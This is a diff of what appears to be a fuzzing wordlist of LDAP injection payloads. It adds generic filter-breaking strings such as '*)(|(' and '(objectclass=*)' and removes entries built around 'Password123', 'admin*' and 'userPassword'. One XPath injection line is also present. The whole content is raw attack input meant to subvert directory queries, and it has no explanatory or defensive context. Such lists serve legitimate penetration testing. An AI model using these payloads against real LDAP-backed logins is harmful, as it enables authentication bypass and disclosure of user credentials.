@@ -8,12 +8,20 @@
 *()|&'
 *(|(mail=*))
 *(|(objectclass=*))
+(objectclass=*)
+*)
+*)(!(&(|
 *)(&
+*)(&)
+*)((|(
 *)(uid=*))(|(uid=*
+*)(|(
 *)(|(&
 *)(|(password=*
+*))
 *))%00
 *))%25%30%30
+*))(|(|
 */*
 *|
 /
@@ -21,16 +29,7 @@
 //*
 @*
 NUL
-Password123
-Password123)
-Password123))
 \
 a*
-a*)((|userPassword=*)
-a*)((|userpassword=*)
-admin*
-validusername)(!(&(|
-validusername)(&)
-validusername))(|(|
 x' or name()='username' or 'x'='y
 |
